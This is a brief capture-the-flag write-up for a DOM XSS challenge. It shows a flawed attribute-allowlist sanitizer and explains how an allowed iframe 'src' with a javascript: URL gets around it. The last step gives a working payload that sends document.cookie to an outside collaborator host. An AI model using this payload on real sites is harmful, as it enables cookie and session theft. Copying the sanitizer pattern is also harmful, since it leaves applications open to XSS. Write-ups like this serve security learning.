## Owner:

> CaptainFreak

#### Solved?

 -Yes

#### Tried:

1. Straigh forward DOM XSS due using iframe.

#### Solutions:

1. 

Challenges had following code:

```javascript
function display(input) {
    document.documentElement.innerHTML = clean(input);
}

function clean(input) {
    const template = document.createElement('template');
    const html = document.createElement('html');
    template.content.appendChild(html);
    html.innerHTML = input;

    sanitize(html);

    const result = html.innerHTML;
    return result;
}

function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i < attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i < children.length; i++) {
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
```

2. We cannot use script hence we need attributes to execute XSS, and only ['src', 'width', 'height', 'alt', 'class'] are allowed.

3. src can be a good place, and iframe's src can have javascript scheme.

4. <iframe src="javascript:document.location='https://burp.collab/?flag='+document.cookie"></iframe>



